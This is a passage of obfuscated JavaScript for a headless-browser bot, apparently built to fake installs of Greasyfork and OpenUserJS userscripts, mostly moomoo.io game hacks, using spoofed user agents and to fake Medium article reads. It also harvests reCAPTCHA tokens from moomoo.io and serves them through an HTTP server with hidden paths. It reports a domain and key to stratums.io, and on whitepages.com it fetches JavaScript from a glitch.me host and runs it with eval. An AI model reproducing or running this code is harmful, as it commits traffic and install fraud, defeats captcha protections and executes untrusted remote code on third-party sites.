      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + X(0x11) + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + Z(0xb, 'a%Z$') + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + Y(0x13) + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + Z(0x5, 'xTjb') + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + Z(0x12, 'NdKi') + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + Y(0x19) + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + X(0x3) + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => -0x1605 + -0x3 * -0x5c6 + 0x4b3
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](0x1e38 + 0x1d6e * -0x1 + 0x1 * -0xca)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, -0x47d + 0x9d4 + 0x1 * -0x4f3), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0x147c + -0x1 * 0x18ea + 0x4d2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x2dd * 0x5 + 0x43 * -0x5c + 0x9c3;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x3 * 0x153 + -0x933 + -0x232 * -0x6; w < getRandomInt(-0xcca + 0x26e7 + 0x3 * -0x8b4, 0x183d + 0x25ed + -0x3e25 * 0x1); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(0x5 * 0x113c + 0x2 * 0xd1f + -0x3cfb * -0x2);
        }
      }();
    }, -0x148a + -0x18fa + 0x2de8), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      const a0 = c;

      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x20b9 + 0x25a1 + -0x1 * 0x465a;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](-0x1e49 * -0x1 + 0x2 * -0x12af + 0x715, -0xa84 * 0x2 + 0xbf6 + -0x4a2 * -0x2)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v[a0(0x0)](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x14e + -0x2d77 + 0xa3f5);
    }, 0x1d * 0x9d + 0x1 * 0xa83 + -0x1be8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x19a7 * -0x1 + 0x2703 * 0x1 + 0xb2 * -0x5d;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(-0x1 * -0x1433 + -0x1dcc + 0x1551), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0xef9 * 0x1 + 0x188d + 0x4 * -0x265), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(-0x2 * -0xcd2ab + -0x16b465 + 0xacaaf);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2392 + -0x1 * 0x15fd + 0x73 * 0x81);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1b7 * 0xe + 0x1f * -0x12d + 0x2a5 * 0x5);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x1c62 + 0x1 * 0x3913 + 0x2df * 0x1);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0xcda + -0x11 * -0xb4 + -0x18cd * 0x1) {
        const a1 = c;
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (0x10f * -0x20 + -0x337 * -0x5 + 0x35 * 0x56));
        const C = A['indexOf']('Chrome/') + 'Chrome/' [a1(0xf)],
          D = A['slice'](C),
          E = D['slice'](0xe * -0x1ae + 0x1e1a + 0x3 * -0x232, D['indexOf']('\x20'));
        return B ? E['slice'](0x8cd + 0x3 * -0xbb6 + 0x1 * 0x1a55, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x3 * -0x4cf + -0x4b7f + 0x6422),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * -0x4172 + -0x1ce2 + -0x8 * -0x50),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
